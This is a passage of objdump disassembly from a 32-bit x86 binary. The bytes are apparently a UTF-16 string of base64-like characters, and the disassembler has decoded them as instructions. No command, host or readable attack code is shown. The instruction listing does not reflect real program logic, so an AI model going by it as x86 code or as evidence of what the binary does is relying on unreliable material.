  40ae7b:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40ae7f:	00 32                	add    %dh,(%edx)
  40ae81:	00 46 00             	add    %al,0x0(%esi)
  40ae84:	73 00                	jae    0x40ae86
  40ae86:	2b 00                	sub    (%eax),%eax
  40ae88:	54                   	push   %esp
  40ae89:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40ae8d:	00 6a 00             	add    %ch,0x0(%edx)
  40ae90:	67 00 2f             	add    %ch,(%bx)
  40ae93:	00 42 00             	add    %al,0x0(%edx)
  40ae96:	77 00                	ja     0x40ae98
  40ae98:	58                   	pop    %eax
  40ae99:	00 55 00             	add    %dl,0x0(%ebp)
  40ae9c:	59                   	pop    %ecx
  40ae9d:	00 69 00             	add    %ch,0x0(%ecx)
  40aea0:	31 00                	xor    %eax,(%eax)
  40aea2:	50                   	push   %eax
  40aea3:	00 6e 00             	add    %ch,0x0(%esi)
  40aea6:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  40aeaa:	6c                   	insb   (%dx),%es:(%edi)
  40aeab:	00 35 00 48 00 2b    	add    %dh,0x2b004800
  40aeb1:	00 58 00             	add    %bl,0x0(%eax)
  40aeb4:	45                   	inc    %ebp
  40aeb5:	00 50 00             	add    %dl,0x0(%eax)
  40aeb8:	47                   	inc    %edi
  40aeb9:	00 30                	add    %dh,(%eax)
  40aebb:	00 2b                	add    %ch,(%ebx)
  40aebd:	00 45 00             	add    %al,0x0(%ebp)
  40aec0:	73 00                	jae    0x40aec2
  40aec2:	6e                   	outsb  %ds:(%esi),(%dx)
  40aec3:	00 49 00             	add    %cl,0x0(%ecx)
  40aec6:	49                   	dec    %ecx
  40aec7:	00 63 00             	add    %ah,0x0(%ebx)
  40aeca:	33 00                	xor    (%eax),%eax
  40aecc:	66 00 43 00          	data16 add %al,0x0(%ebx)
  40aed0:	79 00                	jns    0x40aed2
  40aed2:	69 00 4f 00 34 00    	imul   $0x34004f,(%eax),%eax
  40aed8:	4c                   	dec    %esp
  40aed9:	00 66 00             	add    %ah,0x0(%esi)
  40aedc:	54                   	push   %esp
  40aedd:	00 49 00             	add    %cl,0x0(%ecx)
  40aee0:	35 00 76 00 35       	xor    $0x35007600,%eax
  40aee5:	00 50 00             	add    %dl,0x0(%eax)
  40aee8:	4c                   	dec    %esp
  40aee9:	00 58 00             	add    %bl,0x0(%eax)
  40aeec:	6a 00                	push   $0x0
  40aeee:	4e                   	dec    %esi
  40aeef:	00 56 00             	add    %dl,0x0(%esi)
  40aef2:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40aef6:	4c                   	dec    %esp
  40aef7:	00 61 00             	add    %ah,0x0(%ecx)
  40aefa:	74 00                	je     0x40aefc
  40aefc:	52                   	push   %edx
  40aefd:	00 70 00             	add    %dh,0x0(%eax)
  40af00:	4a                   	dec    %edx
  40af01:	00 68 00             	add    %ch,0x0(%eax)
  40af04:	33 00                	xor    (%eax),%eax
  40af06:	78 00                	js     0x40af08
  40af08:	59                   	pop    %ecx
  40af09:	00 55 00             	add    %dl,0x0(%ebp)
  40af0c:	61                   	popa
  40af0d:	00 39                	add    %bh,(%ecx)
  40af0f:	00 78 00             	add    %bh,0x0(%eax)
  40af12:	6e                   	outsb  %ds:(%esi),(%dx)
  40af13:	00 56 00             	add    %dl,0x0(%esi)
  40af16:	6e                   	outsb  %ds:(%esi),(%dx)
  40af17:	00 30                	add    %dh,(%eax)
  40af19:	00 46 00             	add    %al,0x0(%esi)
  40af1c:	76 00                	jbe    0x40af1e
  40af1e:	46                   	inc    %esi
  40af1f:	00 57 00             	add    %dl,0x0(%edi)
  40af22:	68 00 70 00 4c       	push   $0x4c007000
  40af27:	00 33                	add    %dh,(%ebx)
  40af29:	00 39                	add    %bh,(%ecx)
  40af2b:	00 61 00             	add    %ah,0x0(%ecx)
  40af2e:	6f                   	outsl  %ds:(%esi),(%dx)
  40af2f:	00 76 00             	add    %dh,0x0(%esi)
  40af32:	61                   	popa
  40af33:	00 6b 00             	add    %ch,0x0(%ebx)
  40af36:	48                   	dec    %eax
  40af37:	00 54 00 34          	add    %dl,0x34(%eax,%eax,1)
  40af3b:	00 75 00             	add    %dh,0x0(%ebp)
  40af3e:	72 00                	jb     0x40af40
  40af40:	75 00                	jne    0x40af42
  40af42:	6d                   	insl   (%dx),%es:(%edi)
  40af43:	00 72 00             	add    %dh,0x0(%edx)
  40af46:	43                   	inc    %ebx
  40af47:	00 45 00             	add    %al,0x0(%ebp)
  40af4a:	52                   	push   %edx
  40af4b:	00 2b                	add    %ch,(%ebx)
  40af4d:	00 62 00             	add    %ah,0x0(%edx)
  40af50:	51                   	push   %ecx
  40af51:	00 37                	add    %dh,(%edi)
  40af53:	00 58 00             	add    %bl,0x0(%eax)
  40af56:	55                   	push   %ebp
  40af57:	00 38                	add    %bh,(%eax)
  40af59:	00 73 00             	add    %dh,0x0(%ebx)
  40af5c:	2b 00                	sub    (%eax),%eax
  40af5e:	6a 00                	push   $0x0
  40af60:	58                   	pop    %eax
  40af61:	00 59 00             	add    %bl,0x0(%ecx)
  40af64:	63 00                	arpl   %eax,(%eax)
  40af66:	45                   	inc    %ebp
  40af67:	00 50 00             	add    %dl,0x0(%eax)
  40af6a:	2b 00                	sub    (%eax),%eax
  40af6c:	6f                   	outsl  %ds:(%esi),(%dx)
  40af6d:	00 6e 00             	add    %ch,0x0(%esi)
  40af70:	50                   	push   %eax
  40af71:	00 33                	add    %dh,(%ebx)
  40af73:	00 47 00             	add    %al,0x0(%edi)
  40af76:	30 00                	xor    %al,(%eax)
  40af78:	71 00                	jno    0x40af7a
  40af7a:	42                   	inc    %edx
  40af7b:	00 70 00             	add    %dh,0x0(%eax)
  40af7e:	46                   	inc    %esi
  40af7f:	00 33                	add    %dh,(%ebx)
  40af81:	00 4d 00             	add    %cl,0x0(%ebp)
  40af84:	55                   	push   %ebp
  40af85:	00 4a 00             	add    %cl,0x0(%edx)
  40af88:	45                   	inc    %ebp
  40af89:	00 78 00             	add    %bh,0x0(%eax)
  40af8c:	79 00                	jns    0x40af8e
  40af8e:	6c                   	insb   (%dx),%es:(%edi)
  40af8f:	00 4a 00             	add    %cl,0x0(%edx)
  40af92:	52                   	push   %edx
  40af93:	00 4f 00             	add    %cl,0x0(%edi)
  40af96:	34 00                	xor    $0x0,%al
  40af98:	4f                   	dec    %edi
  40af99:	00 76 00             	add    %dh,0x0(%esi)
  40af9c:	6b 00 36             	imul   $0x36,(%eax),%eax
  40af9f:	00 49 00             	add    %cl,0x0(%ecx)
  40afa2:	49                   	dec    %ecx
  40afa3:	00 4d 00             	add    %cl,0x0(%ebp)
  40afa6:	61                   	popa
  40afa7:	00 69 00             	add    %ch,0x0(%ecx)
  40afaa:	41                   	inc    %ecx
  40afab:	00 2b                	add    %ch,(%ebx)
  40afad:	00 70 00             	add    %dh,0x0(%eax)
  40afb0:	69 00 6a 00 36 00    	imul   $0x36006a,(%eax),%eax
  40afb6:	30 00                	xor    %al,(%eax)
  40afb8:	4a                   	dec    %edx
  40afb9:	00 62 00             	add    %ah,0x0(%edx)
  40afbc:	48                   	dec    %eax
  40afbd:	00 43 00             	add    %al,0x0(%ebx)
  40afc0:	59                   	pop    %ecx
  40afc1:	00 4d 00             	add    %cl,0x0(%ebp)
  40afc4:	33 00                	xor    (%eax),%eax
  40afc6:	79 00                	jns    0x40afc8
  40afc8:	6f                   	outsl  %ds:(%esi),(%dx)
  40afc9:	00 6f 00             	add    %ch,0x0(%edi)
  40afcc:	4e                   	dec    %esi
  40afcd:	00 56 00             	add    %dl,0x0(%esi)
  40afd0:	34 00                	xor    $0x0,%al
  40afd2:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40afd6:	49                   	dec    %ecx
  40afd7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40afda:	46                   	inc    %esi
  40afdb:	00 51 00             	add    %dl,0x0(%ecx)
  40afde:	35 00 30 00 66       	xor    $0x66003000,%eax
  40afe3:	00 52 00             	add    %dl,0x0(%edx)
  40afe6:	72 00                	jb     0x40afe8
  40afe8:	67 00 4e 00          	add    %cl,0x0(%bp)
  40afec:	63 00                	arpl   %eax,(%eax)
  40afee:	39 00                	cmp    %eax,(%eax)
  40aff0:	6f                   	outsl  %ds:(%esi),(%dx)
  40aff1:	00 46 00             	add    %al,0x0(%esi)
  40aff4:	72 00                	jb     0x40aff6
  40aff6:	4a                   	dec    %edx
  40aff7:	00 67 00             	add    %ah,0x0(%edi)
  40affa:	2b 00                	sub    (%eax),%eax
  40affc:	43                   	inc    %ebx
  40affd:	00 61 00             	add    %ah,0x0(%ecx)
  40b000:	2f                   	das
  40b001:	00 61 00             	add    %ah,0x0(%ecx)
  40b004:	30 00                	xor    %al,(%eax)
  40b006:	49                   	dec    %ecx
  40b007:	00 4b 00             	add    %cl,0x0(%ebx)
  40b00a:	34 00                	xor    $0x0,%al
  40b00c:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40b010:	63 00                	arpl   %eax,(%eax)
  40b012:	4c                   	dec    %esp
  40b013:	00 49 00             	add    %cl,0x0(%ecx)
  40b016:	55                   	push   %ebp
  40b017:	00 5a 00             	add    %bl,0x0(%edx)
  40b01a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b01b:	00 55 00             	add    %dl,0x0(%ebp)
  40b01e:	67 00 77 00          	add    %dh,0x0(%bx)
  40b022:	79 00                	jns    0x40b024
  40b024:	6b 00 36             	imul   $0x36,(%eax),%eax
  40b027:	00 37                	add    %dh,(%edi)
  40b029:	00 63 00             	add    %ah,0x0(%ebx)
  40b02c:	48                   	dec    %eax
  40b02d:	00 73 00             	add    %dh,0x0(%ebx)
  40b030:	38 00                	cmp    %al,(%eax)
  40b032:	4a                   	dec    %edx
  40b033:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40b037:	00 55 00             	add    %dl,0x0(%ebp)
  40b03a:	61                   	popa
  40b03b:	00 38                	add    %bh,(%eax)
  40b03d:	00 43 00             	add    %al,0x0(%ebx)
  40b040:	38 00                	cmp    %al,(%eax)
  40b042:	45                   	inc    %ebp
  40b043:	00 46 00             	add    %al,0x0(%esi)
  40b046:	54                   	push   %esp
  40b047:	00 35 00 7a 00 76    	add    %dh,0x76007a00
  40b04d:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40b051:	00 76 00             	add    %dh,0x0(%esi)
  40b054:	66 00 35 00 34 00 43 	data16 add %dh,0x43003400
  40b05b:	00 49 00             	add    %cl,0x0(%ecx)
  40b05e:	35 00 4c 00 55       	xor    $0x55004c00,%eax
  40b063:	00 7a 00             	add    %bh,0x0(%edx)
  40b066:	4c                   	dec    %esp
  40b067:	00 4d 00             	add    %cl,0x0(%ebp)
  40b06a:	7a 00                	jp     0x40b06c
  40b06c:	49                   	dec    %ecx
  40b06d:	00 77 00             	add    %dh,0x0(%edi)
  40b070:	43                   	inc    %ebx
  40b071:	00 55 00             	add    %dl,0x0(%ebp)
  40b074:	38 00                	cmp    %al,(%eax)
  40b076:	4b                   	dec    %ebx
  40b077:	00 59 00             	add    %bl,0x0(%ecx)
  40b07a:	7a 00                	jp     0x40b07c
  40b07c:	72 00                	jb     0x40b07e
  40b07e:	49                   	dec    %ecx
  40b07f:	00 57 00             	add    %dl,0x0(%edi)
  40b082:	70 00                	jo     0x40b084
  40b084:	74 00                	je     0x40b086
  40b086:	4d                   	dec    %ebp
  40b087:	00 75 00             	add    %dh,0x0(%ebp)
  40b08a:	6a 00                	push   $0x0
  40b08c:	4c                   	dec    %esp
  40b08d:	00 5a 00             	add    %bl,0x0(%edx)
  40b090:	79 00                	jns    0x40b092
  40b092:	72 00                	jb     0x40b094
  40b094:	58                   	pop    %eax
  40b095:	00 46 00             	add    %al,0x0(%esi)
  40b098:	48                   	dec    %eax
  40b099:	00 57 00             	add    %dl,0x0(%edi)
  40b09c:	4d                   	dec    %ebp
  40b09d:	00 5a 00             	add    %bl,0x0(%edx)
  40b0a0:	2f                   	das
  40b0a1:	00 7a 00             	add    %bh,0x0(%edx)
  40b0a4:	77 00                	ja     0x40b0a6
  40b0a6:	4b                   	dec    %ebx
  40b0a7:	00 51 00             	add    %dl,0x0(%ecx)
  40b0aa:	41                   	inc    %ecx
  40b0ab:	00 4f 00             	add    %cl,0x0(%edi)
  40b0ae:	4a                   	dec    %edx
  40b0af:	00 73 00             	add    %dh,0x0(%ebx)
  40b0b2:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40b0b6:	39 00                	cmp    %eax,(%eax)
  40b0b8:	6c                   	insb   (%dx),%es:(%edi)
  40b0b9:	00 2b                	add    %ch,(%ebx)
  40b0bb:	00 36                	add    %dh,(%esi)
  40b0bd:	00 71 00             	add    %dh,0x0(%ecx)
  40b0c0:	7a 00                	jp     0x40b0c2
  40b0c2:	34 00                	xor    $0x0,%al
  40b0c4:	66 00 37             	data16 add %dh,(%edi)
  40b0c7:	00 55 00             	add    %dl,0x0(%ebp)
  40b0ca:	4c                   	dec    %esp
  40b0cb:	00 42 00             	add    %al,0x0(%edx)
  40b0ce:	70 00                	jo     0x40b0d0
  40b0d0:	7a 00                	jp     0x40b0d2
  40b0d2:	54                   	push   %esp
  40b0d3:	00 4f 00             	add    %cl,0x0(%edi)
  40b0d6:	4f                   	dec    %edi
  40b0d7:	00 6a 00             	add    %ch,0x0(%edx)
  40b0da:	71 00                	jno    0x40b0dc
  40b0dc:	57                   	push   %edi
  40b0dd:	00 79 00             	add    %bh,0x0(%ecx)
  40b0e0:	71 00                	jno    0x40b0e2
  40b0e2:	31 00                	xor    %eax,(%eax)
  40b0e4:	4c                   	dec    %esp
  40b0e5:	00 6b 00             	add    %ch,0x0(%ebx)
  40b0e8:	62 00                	bound  %eax,(%eax)
  40b0ea:	77 00                	ja     0x40b0ec
  40b0ec:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0ed:	00 6f 00             	add    %ch,0x0(%edi)
  40b0f0:	31 00                	xor    %eax,(%eax)
  40b0f2:	75 00                	jne    0x40b0f4
  40b0f4:	49                   	dec    %ecx
  40b0f5:	00 50 00             	add    %dl,0x0(%eax)
  40b0f8:	61                   	popa
  40b0f9:	00 42 00             	add    %al,0x0(%edx)
  40b0fc:	62 00                	bound  %eax,(%eax)
  40b0fe:	4e                   	dec    %esi
  40b0ff:	00 62 00             	add    %ah,0x0(%edx)
  40b102:	63 00                	arpl   %eax,(%eax)
  40b104:	4a                   	dec    %edx
  40b105:	00 71 00             	add    %dh,0x0(%ecx)
  40b108:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40b10c:	6c                   	insb   (%dx),%es:(%edi)
  40b10d:	00 36                	add    %dh,(%esi)
  40b10f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b112:	7a 00                	jp     0x40b114
  40b114:	47                   	inc    %edi
  40b115:	00 4e 00             	add    %cl,0x0(%esi)
  40b118:	32 00                	xor    (%eax),%al
  40b11a:	46                   	inc    %esi
  40b11b:	00 59 00             	add    %bl,0x0(%ecx)
  40b11e:	66 00 76 00          	data16 add %dh,0x0(%esi)
  40b122:	34 00                	xor    $0x0,%al
  40b124:	54                   	push   %esp
  40b125:	00 36                	add    %dh,(%esi)
  40b127:	00 78 00             	add    %bh,0x0(%eax)
  40b12a:	31 00                	xor    %eax,(%eax)
  40b12c:	64 00 39             	add    %bh,%fs:(%ecx)
  40b12f:	00 41 00             	add    %al,0x0(%ecx)
  40b132:	5a                   	pop    %edx
  40b133:	00 35 00 30 00 48    	add    %dh,0x48003000
  40b139:	00 4e 00             	add    %cl,0x0(%esi)
  40b13c:	55                   	push   %ebp
  40b13d:	00 62 00             	add    %ah,0x0(%edx)
  40b140:	55                   	push   %ebp
  40b141:	00 2b                	add    %ch,(%ebx)
  40b143:	00 6d 00             	add    %ch,0x0(%ebp)
  40b146:	2f                   	das
  40b147:	00 79 00             	add    %bh,0x0(%ecx)
  40b14a:	6d                   	insl   (%dx),%es:(%edi)
  40b14b:	00 59 00             	add    %bl,0x0(%ecx)
  40b14e:	44                   	inc    %esp
  40b14f:	00 78 00             	add    %bh,0x0(%eax)
  40b152:	35 00 31 00 54       	xor    $0x54003100,%eax
  40b157:	00 63 00             	add    %ah,0x0(%ebx)
  40b15a:	4b                   	dec    %ebx
  40b15b:	00 31                	add    %dh,(%ecx)
  40b15d:	00 38                	add    %bh,(%eax)
  40b15f:	00 43 00             	add    %al,0x0(%ebx)
  40b162:	31 00                	xor    %eax,(%eax)
  40b164:	33 00                	xor    (%eax),%eax
  40b166:	6a 00                	push   $0x0
  40b168:	41                   	inc    %ecx
  40b169:	00 63 00             	add    %ah,0x0(%ebx)
  40b16c:	30 00                	xor    %al,(%eax)
  40b16e:	75 00                	jne    0x40b170
  40b170:	42                   	inc    %edx
  40b171:	00 6e 00             	add    %ch,0x0(%esi)
  40b174:	6e                   	outsb  %ds:(%esi),(%dx)
  40b175:	00 36                	add    %dh,(%esi)
  40b177:	00 4a 00             	add    %cl,0x0(%edx)
  40b17a:	45                   	inc    %ebp
  40b17b:	00 6a 00             	add    %ch,0x0(%edx)
  40b17e:	45                   	inc    %ebp
  40b17f:	00 77 00             	add    %dh,0x0(%edi)
  40b182:	34 00                	xor    $0x0,%al
  40b184:	6c                   	insb   (%dx),%es:(%edi)
  40b185:	00 6e 00             	add    %ch,0x0(%esi)
  40b188:	58                   	pop    %eax
  40b189:	00 59 00             	add    %bl,0x0(%ecx)
  40b18c:	58                   	pop    %eax
  40b18d:	00 30                	add    %dh,(%eax)
  40b18f:	00 2f                	add    %ch,(%edi)
  40b191:	00 55 00             	add    %dl,0x0(%ebp)
  40b194:	36 00 39             	add    %bh,%ss:(%ecx)
  40b197:	00 47 00             	add    %al,0x0(%edi)
  40b19a:	46                   	inc    %esi
  40b19b:	00 69 00             	add    %ch,0x0(%ecx)
  40b19e:	54                   	push   %esp
  40b19f:	00 39                	add    %bh,(%ecx)
  40b1a1:	00 78 00             	add    %bh,0x0(%eax)
  40b1a4:	35 00 61 00 2f       	xor    $0x2f006100,%eax
  40b1a9:	00 7a 00             	add    %bh,0x0(%edx)
  40b1ac:	69 00 65 00 59 00    	imul   $0x590065,(%eax),%eax
  40b1b2:	45                   	inc    %ebp
  40b1b3:	00 7a 00             	add    %bh,0x0(%edx)
  40b1b6:	37                   	aaa
  40b1b7:	00 4f 00             	add    %cl,0x0(%edi)
  40b1ba:	58                   	pop    %eax
  40b1bb:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40b1bf:	00 32                	add    %dh,(%edx)
  40b1c1:	00 50 00             	add    %dl,0x0(%eax)
  40b1c4:	55                   	push   %ebp
  40b1c5:	00 46 00             	add    %al,0x0(%esi)
  40b1c8:	42                   	inc    %edx
  40b1c9:	00 51 00             	add    %dl,0x0(%ecx)
  40b1cc:	39 00                	cmp    %eax,(%eax)
  40b1ce:	53                   	push   %ebx
  40b1cf:	00 52 00             	add    %dl,0x0(%edx)
  40b1d2:	32 00                	xor    (%eax),%al
  40b1d4:	34 00                	xor    $0x0,%al
  40b1d6:	4a                   	dec    %edx
  40b1d7:	00 63 00             	add    %ah,0x0(%ebx)
  40b1da:	48                   	dec    %eax
  40b1db:	00 4e 00             	add    %cl,0x0(%esi)
  40b1de:	34 00                	xor    $0x0,%al
  40b1e0:	65 00 39             	add    %bh,%gs:(%ecx)
  40b1e3:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40b1e7:	00 31                	add    %dh,(%ecx)
  40b1e9:	00 70 00             	add    %dh,0x0(%eax)
  40b1ec:	48                   	dec    %eax
  40b1ed:	00 76 00             	add    %dh,0x0(%esi)
  40b1f0:	47                   	inc    %edi
  40b1f1:	00 4a 00             	add    %cl,0x0(%edx)
  40b1f4:	4d                   	dec    %ebp
  40b1f5:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1f8:	2b 00                	sub    (%eax),%eax
  40b1fa:	4b                   	dec    %ebx
  40b1fb:	00 49 00             	add    %cl,0x0(%ecx)
  40b1fe:	57                   	push   %edi
  40b1ff:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b202:	48                   	dec    %eax
  40b203:	00 76 00             	add    %dh,0x0(%esi)
  40b206:	34 00                	xor    $0x0,%al
  40b208:	6b 00 47             	imul   $0x47,(%eax),%eax
  40b20b:	00 79 00             	add    %bh,0x0(%ecx)
  40b20e:	42                   	inc    %edx
  40b20f:	00 39                	add    %bh,(%ecx)
  40b211:	00 48 00             	add    %cl,0x0(%eax)
  40b214:	63 00                	arpl   %eax,(%eax)
  40b216:	66 00 32             	data16 add %dh,(%edx)
  40b219:	00 6a 00             	add    %ch,0x0(%edx)
  40b21c:	43                   	inc    %ebx
  40b21d:	00 61 00             	add    %ah,0x0(%ecx)
  40b220:	50                   	push   %eax
  40b221:	00 70 00             	add    %dh,0x0(%eax)
  40b224:	7a 00                	jp     0x40b226
  40b226:	47                   	inc    %edi
  40b227:	00 6f 00             	add    %ch,0x0(%edi)
  40b22a:	35 00 69 00 4b       	xor    $0x4b006900,%eax
  40b22f:	00 31                	add    %dh,(%ecx)
  40b231:	00 39                	add    %bh,(%ecx)
  40b233:	00 41 00             	add    %al,0x0(%ecx)
  40b236:	67 00 45 00          	add    %al,0x0(%di)
  40b23a:	4e                   	dec    %esi
  40b23b:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  40b23f:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40b243:	00 77 00             	add    %dh,0x0(%edi)
  40b246:	44                   	inc    %esp
  40b247:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40b24b:	00 2b                	add    %ch,(%ebx)
  40b24d:	00 32                	add    %dh,(%edx)
  40b24f:	00 35 00 69 00 4b    	add    %dh,0x4b006900
  40b255:	00 6b 00             	add    %ch,0x0(%ebx)
  40b258:	63 00                	arpl   %eax,(%eax)
  40b25a:	2b 00                	sub    (%eax),%eax
  40b25c:	52                   	push   %edx
  40b25d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b260:	52                   	push   %edx
  40b261:	00 77 00             	add    %dh,0x0(%edi)
  40b264:	74 00                	je     0x40b266
  40b266:	63 00                	arpl   %eax,(%eax)
  40b268:	2b 00                	sub    (%eax),%eax
  40b26a:	61                   	popa
  40b26b:	00 58 00             	add    %bl,0x0(%eax)
  40b26e:	45                   	inc    %ebp
  40b26f:	00 55 00             	add    %dl,0x0(%ebp)
  40b272:	6e                   	outsb  %ds:(%esi),(%dx)
  40b273:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40b277:	00 6a 00             	add    %ch,0x0(%edx)
  40b27a:	2f                   	das
  40b27b:	00 73 00             	add    %dh,0x0(%ebx)
  40b27e:	39 00                	cmp    %eax,(%eax)
  40b280:	68 00 6e 00 79       	push   $0x79006e00
  40b285:	00 73 00             	add    %dh,0x0(%ebx)
  40b288:	58                   	pop    %eax
  40b289:	00 50 00             	add    %dl,0x0(%eax)
  40b28c:	77 00                	ja     0x40b28e
  40b28e:	59                   	pop    %ecx
  40b28f:	00 59 00             	add    %bl,0x0(%ecx)
  40b292:	4b                   	dec    %ebx
  40b293:	00 37                	add    %dh,(%edi)
  40b295:	00 4e 00             	add    %cl,0x0(%esi)
  40b298:	6f                   	outsl  %ds:(%esi),(%dx)
  40b299:	00 36                	add    %dh,(%esi)
  40b29b:	00 37                	add    %dh,(%edi)
  40b29d:	00 4d 00             	add    %cl,0x0(%ebp)
  40b2a0:	6d                   	insl   (%dx),%es:(%edi)
  40b2a1:	00 4b 00             	add    %cl,0x0(%ebx)
  40b2a4:	75 00                	jne    0x40b2a6
  40b2a6:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40b2aa:	71 00                	jno    0x40b2ac
  40b2ac:	45                   	inc    %ebp
  40b2ad:	00 4d 00             	add    %cl,0x0(%ebp)
  40b2b0:	41                   	inc    %ecx
  40b2b1:	00 6e 00             	add    %ch,0x0(%esi)
  40b2b4:	35 00 56 00 5a       	xor    $0x5a005600,%eax
  40b2b9:	00 67 00             	add    %ah,0x0(%edi)
  40b2bc:	7a 00                	jp     0x40b2be
  40b2be:	70 00                	jo     0x40b2c0
  40b2c0:	61                   	popa
  40b2c1:	00 73 00             	add    %dh,0x0(%ebx)
  40b2c4:	6c                   	insb   (%dx),%es:(%edi)
  40b2c5:	00 4a 00             	add    %cl,0x0(%edx)
  40b2c8:	71 00                	jno    0x40b2ca
  40b2ca:	43                   	inc    %ebx
  40b2cb:	00 46 00             	add    %al,0x0(%esi)
  40b2ce:	7a 00                	jp     0x40b2d0
  40b2d0:	46                   	inc    %esi
  40b2d1:	00 45 00             	add    %al,0x0(%ebp)
  40b2d4:	79 00                	jns    0x40b2d6
  40b2d6:	78 00                	js     0x40b2d8
  40b2d8:	6c                   	insb   (%dx),%es:(%edi)
  40b2d9:	00 6b 00             	add    %ch,0x0(%ebx)
  40b2dc:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40b2e0:	46                   	inc    %esi
  40b2e1:	00 47 00             	add    %al,0x0(%edi)
  40b2e4:	44                   	inc    %esp
  40b2e5:	00 71 00             	add    %dh,0x0(%ecx)
  40b2e8:	72 00                	jb     0x40b2ea
  40b2ea:	7a 00                	jp     0x40b2ec
  40b2ec:	7a 00                	jp     0x40b2ee
  40b2ee:	62 00                	bound  %eax,(%eax)
  40b2f0:	78 00                	js     0x40b2f2
  40b2f2:	5a                   	pop    %edx
  40b2f3:	00 67 00             	add    %ah,0x0(%edi)
  40b2f6:	77 00                	ja     0x40b2f8
  40b2f8:	31 00                	xor    %eax,(%eax)
  40b2fa:	50                   	push   %eax
  40b2fb:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40b2ff:	00 57 00             	add    %dl,0x0(%edi)
  40b302:	74 00                	je     0x40b304
  40b304:	35 00 6e 00 72       	xor    $0x72006e00,%eax
  40b309:	00 51 00             	add    %dl,0x0(%ecx)
  40b30c:	39 00                	cmp    %eax,(%eax)
  40b30e:	69 00 4e 00 44 00    	imul   $0x44004e,(%eax),%eax
  40b314:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40b318:	63 00                	arpl   %eax,(%eax)
  40b31a:	56                   	push   %esi
  40b31b:	00 43 00             	add    %al,0x0(%ebx)
  40b31e:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40b322:	6e                   	outsb  %ds:(%esi),(%dx)
  40b323:	00 4d 00             	add    %cl,0x0(%ebp)
  40b326:	6d                   	insl   (%dx),%es:(%edi)
  40b327:	00 4d 00             	add    %cl,0x0(%ebp)
  40b32a:	30 00                	xor    %al,(%eax)
  40b32c:	78 00                	js     0x40b32e
  40b32e:	45                   	inc    %ebp
  40b32f:	00 7a 00             	add    %bh,0x0(%edx)
  40b332:	72 00                	jb     0x40b334
  40b334:	59                   	pop    %ecx
  40b335:	00 72 00             	add    %dh,0x0(%edx)
  40b338:	7a 00                	jp     0x40b33a
  40b33a:	72 00                	jb     0x40b33c
  40b33c:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40b340:	4b                   	dec    %ebx
  40b341:	00 56 00             	add    %dl,0x0(%esi)
  40b344:	76 00                	jbe    0x40b346
  40b346:	76 00                	jbe    0x40b348
  40b348:	63 00                	arpl   %eax,(%eax)
  40b34a:	50                   	push   %eax
  40b34b:	00 4d 00             	add    %cl,0x0(%ebp)
  40b34e:	2b 00                	sub    (%eax),%eax
  40b350:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40b354:	71 00                	jno    0x40b356
  40b356:	5a                   	pop    %edx
  40b357:	00 50 00             	add    %dl,0x0(%eax)
  40b35a:	48                   	dec    %eax
  40b35b:	00 4d 00             	add    %cl,0x0(%ebp)
  40b35e:	4a                   	dec    %edx
  40b35f:	00 6d 00             	add    %ch,0x0(%ebp)
  40b362:	46                   	inc    %esi
  40b363:	00 6a 00             	add    %ch,0x0(%edx)
  40b366:	72 00                	jb     0x40b368
  40b368:	79 00                	jns    0x40b36a
  40b36a:	58                   	pop    %eax
  40b36b:	00 7a 00             	add    %bh,0x0(%edx)
  40b36e:	68 00 78 00 31       	push   $0x31007800
  40b373:	00 66 00             	add    %ah,0x0(%esi)
  40b376:	6e                   	outsb  %ds:(%esi),(%dx)
  40b377:	00 52 00             	add    %dl,0x0(%edx)
  40b37a:	56                   	push   %esi
  40b37b:	00 6f 00             	add    %ch,0x0(%edi)
  40b37e:	31 00                	xor    %eax,(%eax)
  40b380:	30 00                	xor    %al,(%eax)
  40b382:	69 00 6e 00 63 00    	imul   $0x63006e,(%eax),%eax
  40b388:	42                   	inc    %edx
  40b389:	00 37                	add    %dh,(%edi)
  40b38b:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  40b38f:	00 6b 00             	add    %ch,0x0(%ebx)
  40b392:	41                   	inc    %ecx
  40b393:	00 61 00             	add    %ah,0x0(%ecx)
  40b396:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40b39a:	70 00                	jo     0x40b39c
  40b39c:	4f                   	dec    %edi
  40b39d:	00 65 00             	add    %ah,0x0(%ebp)
  40b3a0:	32 00                	xor    (%eax),%al
  40b3a2:	4e                   	dec    %esi
  40b3a3:	00 51 00             	add    %dl,0x0(%ecx)
  40b3a6:	47                   	inc    %edi
  40b3a7:	00 6a 00             	add    %ch,0x0(%edx)
  40b3aa:	76 00                	jbe    0x40b3ac
  40b3ac:	58                   	pop    %eax
  40b3ad:	00 52 00             	add    %dl,0x0(%edx)
  40b3b0:	53                   	push   %ebx
  40b3b1:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  40b3b5:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3b8:	75 00                	jne    0x40b3ba
  40b3ba:	37                   	aaa
